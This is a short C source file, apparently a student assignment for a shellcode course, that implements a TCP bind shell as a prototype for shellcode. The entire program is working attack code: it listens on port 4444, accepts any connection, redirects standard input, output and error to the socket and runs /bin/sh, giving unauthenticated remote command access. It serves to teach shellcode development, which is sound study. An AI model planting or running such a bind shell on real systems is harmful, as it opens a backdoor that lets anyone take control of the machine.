/**********************************************
*   John
*   SLAE Assignment 1
*   Create Shell_Bind_TCP shellcode to initiate a
*   shell on successful connection.
***********************************************/
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>


int main(){

  int fd, new_fd; //file descriptor to hold socket() output and accept() output respectively
  fd = socket(AF_INET, SOCK_STREAM, 0);

  // define structures for home and remote machines
  struct sockaddr_in home, remote;
  
  // Set attributes in sockaddr_in home
  home.sin_family = AF_INET;
  home.sin_port = htons(4444);
  home.sin_addr.s_addr = 0;
  memset(&(home.sin_zero), '\0', 8);

  // Bind socket to home address structure
  bind(fd, (const struct socketaddr *)&home, 16);

  // Listen on socket for a max length of 4 pending connections
  listen(fd, 4);

  // Create new file descriptor with contents of accepted connection structure
  socklen_t sin_size = sizeof(struct sockaddr_in);
  new_fd = accept(fd, (struct sockaddr *)&remote, &sin_size);

  // Duplicate socket file descriptor to each standard I/O file descriptor: stdin,
  // stdout, and stderr
  dup2(new_fd, 2);
  dup2(new_fd, 1);
  dup2(new_fd, 0);

  // Execute shell
  execve("//bin/sh", (char*[]){"//bin/sh", NULL}, NULL);

}
